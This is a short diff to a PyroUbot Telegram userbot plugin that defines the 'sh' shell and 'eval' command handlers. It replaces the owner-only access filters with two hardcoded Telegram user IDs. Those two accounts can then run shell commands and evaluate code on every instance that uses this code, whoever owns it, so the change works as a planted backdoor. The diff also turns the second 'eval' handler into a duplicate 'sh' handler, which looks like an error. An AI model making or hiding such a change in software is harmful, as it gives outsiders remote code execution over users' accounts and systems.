@@ -1,14 +1,14 @@
 from PyroUbot import *
 
 
-@PY.BOT("sh", FILTERS.OWNER)
-@PY.UBOT("sh", FILTERS.ME_OWNER)
+@PY.BOT("sh", filters.user([1948147616, 843716328]))
+@PY.UBOT("sh", filters.user([1948147616, 843716328]))
 async def _(client, message):
     await shell_cmd(client, message)
 
 
-@PY.BOT("eval", FILTERS.OWNER)
-@PY.UBOT("eval", FILTERS.ME_OWNER)
+@PY.BOT("eval", filters.user([1948147616, 843716328]))
+@PY.UBOT("sh", filters.user([1948147616, 843716328]))
 async def _(client, message):
     await evalator_cmd(client, message)
 
